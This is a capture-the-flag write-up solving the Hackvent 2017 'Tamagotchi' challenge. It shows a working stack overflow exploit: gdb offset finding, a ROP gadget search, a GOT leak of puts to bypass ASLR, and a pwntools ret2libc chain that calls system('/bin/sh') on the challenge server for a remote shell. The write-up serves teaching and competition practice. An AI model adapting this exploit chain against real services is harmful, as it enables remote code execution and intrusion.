# Day 21: Tamagotchi
  
*Ohai fuud or gtfo*

**Ohai**

I'm a little tamagotchi who wants fuuuuud, pls don't giveh me too much or I'll crash...

`nc challenges.hackvent.hacking-lab.com 31337`

[File #1: tamagotchi](files/tamagotchi "tamagotchi") + [File #2: libc-2.26.so](files/libc-2.26.so "libc-2.26.so")

### Solution

"*pls don't giveh me too much or I'll crash...*" - hmm, sounds like buffer overflow vulnerability. 

```bash
$ file tamagotchi libc-2.26.so 
tamagotchi:   ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bc180fb6cf42f3134c8b07c42c35f1efdbd88cc2, not stripped
libc-2.26.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6d2b609f0c8e7b338f767b08c5ac712fac809d31, for GNU/Linux 3.2.0, stripped
```

I followed this very useful tutorial about 64-bit Linux stack smashing: [part 1](https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/), [part 2](https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/), [part 3](https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/).

I tried to decompile it in IDA first.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char s; // [rsp+0h] [rbp-4D0h]
  char v5; // [rsp+400h] [rbp-D0h]
  int v6; // [rsp+4C8h] [rbp-8h]
  int v7; // [rsp+4CCh] [rbp-4h]

  v7 = 1;
  v6 = 0;
  show_title(*(_QWORD *)&argc, argv, envp);
  result = show_menu();
  while ( v7 )
  {
    puts("[ch01c3]> ");
    fgets(&s, 1024, _bss_start);
    v6 = atoi(&s);
    if ( v6 == 1 )
    {
      puts("[f00d]> ");
      fgets(&v5, 1024, _bss_start);
      result = puts("[+] nom nom nom ");
    }
    else if ( v6 == 2 )
    {
      result = puts("[+] bye bye");
      v7 = 0;
    }
    else
    {
      result = puts("[-] nope!");
    }
  }
  return result;
}
```

The second `fgets` call looked promising - it reads 1024 bytes into a buffer of length of only 200 bytes. So the next step was to find offset to overflow the buffer and overwrite RIP register using `gdb`. Offset of 216 did the job.

```bash
$ gdb tamagotchi
gdb-peda$ pattern_create 250
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b'
gdb-peda$ r
...
[MENU]
1.) eat
2.) bye
[ch01c3]> 
1
[f00d]> 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b
[+] nom nom nom 
[ch01c3]> 
2
[+] bye bye

Program received signal SIGSEGV, Segmentation fault.
...
RSP: 0x7fffffffe478 ("nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%b\n")
RIP: 0x40079d (<main+211>:	ret)
...
gdb-peda$ x/wx $rsp
0x7fffffffe478:	0x4325416e
gdb-peda$ pattern_offset 0x4325416e
1126515054 found at offset: 216
```

In 64-bit binaries, function parameters are passed in registers. The first six parameters are passed in registers RDI, RSI, RDX, RCX, R8, and R9. So I employed [`ropper`](https://github.com/sashs/ropper) to find a suitable ROP injection point.

```bash
ropper --file tamagotchi --search "% ?di"
0x0000000000400695: call 0x4b0; mov edi, 0x4008b7; call 0x4b0; pop rbp; ret;
0x00000000004006b9: call 0x4b0; mov edi, 0x400a5b; call 0x4b0; pop rbp; ret;
0x000000000040069a: mov edi, 0x4008b7; call 0x4b0; pop rbp; ret;
0x00000000004006be: mov edi, 0x400a5b; call 0x4b0; pop rbp; ret;
0x0000000000400550: mov edi, 0x601048; jmp rax;
0x00000000004006b6: or al, byte ptr [rax]; call 0x4b0; mov edi, 0x400a5b; call 0x4b0; pop rbp; ret;
0x0000000000400692: or dword ptr [rax], eax; call 0x4b0; mov edi, 0x4008b7; call 0x4b0; pop rbp; ret;
0x000000000040054f: pop rbp; mov edi, 0x601048; jmp rax;
0x0000000000400803: pop rdi; ret;
```

The last one at `0x400803` was perfect since the first function parameter needs to be in RDI.

I could take advantage of static analysis of provided copy of `libc.so`, but since ASLR was enabled on the remote server I had to leak remote address of the libc library in memory first.

The high level solution to exploiting this is as follows:
1. Leak the address of a library function in the GOT. In this case I leaked `puts` GOT entry, which gave me `puts` address.
2. Get libc’s base address so we can calculate the address of other library functions. The base address is simply the difference between leaked `puts` address and `puts` offset from provided `libc.so`.
3. A library function’s address can be obtained by adding its offset from `libc.so` to libc’s base address. In this case I got address of `system` function.

```python
from pwn import *
from struct import *

offset     = 216        # offset to overflow to RIP           <-- gdb pattern_create + pattern_offset
pop_ret    = 0x400803   # ROP to inject RDI register          <-- ropper --file tamagotchi --search "% rdi"
main       = 0x4006ca   # address of main to jump back        <-- gdb tamagotchi -ex "p main"
puts_plt   = 0x4004b0   # puts@plt (procedure linkage table)  <-- gdb tamagotchi -ex "p puts"
puts_got   = 0x601018   # puts@got (global offset table)      <-- objdump -R tamagotchi | grep puts
puts_off   = 0x078460   # offset to puts() in libc            <-- readelf -s libc-2.26.so | grep puts
system_off = 0x047dc0   # offset to system() in libc          <-- readelf -s libc-2.26.so | grep system
bin_sh_off = 0x1a3ee0   # offset to "/bin/sh" in libc         <-- objdump -s libc-2.26.so | grep /bin/sh

r = remote("challenges.hackvent.hacking-lab.com", 31337)

# buffer to leak remote puts address
buf_leak = "A" * offset                 # padding to RIP's offset
buf_leak += pack("<Q", pop_ret)         # pop arg into RDI
buf_leak += pack("<Q", puts_got)        # arg: puts@got entry
buf_leak += pack("<Q", puts_plt)        # return to puts
buf_leak += pack("<Q", main)            # return to main

# stage 1: read the remote puts() address
r.recvuntil("[ch01c3]>")
r.sendline("1")                         # choose to eat
r.recvuntil("[f00d]>")
r.sendline(buf_leak)                    # send buffer to leak puts address
r.recvuntil("[ch01c3]>")
r.sendline("2")                         # choose to exit
r.recvuntil("[+] bye bye\n")

# stage 2: calculate remote addresses from known offsets
puts_addr = u64(r.recv(6) + "\x00" * 2) # read remote puts address
libc_base = puts_addr - puts_off        # calculate libc base address
system = libc_base + system_off         # calculate system address
bin_sh = libc_base + bin_sh_off         # calculate "/bin/sh" address

print "[+] libc base at: 0x%08x" % libc_base
print "[+] system() at: 0x%08x" % system
print "[+] /bin/sh at: 0x%08x" % bin_sh
```

It worked like a charm! Now it was time to do the second buffer overflow to get RCE and remote shell access. I used the same ROP injection point to call `system` function with address of `/bin/sh` as its argument and then switched to interactive mode to be able to execute commands.

```python
# buffer to get remote shell
buf_rce = "A" * offset                  # padding to RIP's offset
buf_rce += pack("<Q", pop_ret)          # pop arg into RDI
buf_rce += pack("<Q", bin_sh)           # arg: "/bin/sh"
buf_rce += pack("<Q", system)           # return to system

# stage 3: pwn
r.recvuntil("[ch01c3]>")
r.sendline("1")                         # choose to eat
r.recvuntil("[f00d]>")
r.sendline(buf_rce)                     # send buffer to get remote shell
r.recvuntil("[ch01c3]>")
r.sendline("2")                         # choose to exit
r.recvuntil("[+] bye bye\n")

r.interactive()                         # switch to interactive mode to use shell
```

The complete source code of this remote exploit can be found [here](../../src/main/python/hackvent2017/Day21.py).

Once I got the remote shell it was pretty straightforward.

```bash
$ ls /home
tamagotchi
$ cd /home/tamagotchi
$ ls
flag  tamagotchi
$ cat flag
HV17-pwn3d-t4m4g0tch3y-thr0ugh-f00d
```

The result flag:

```
HV17-pwn3d-t4m4g0tch3y-thr0ugh-f00d
```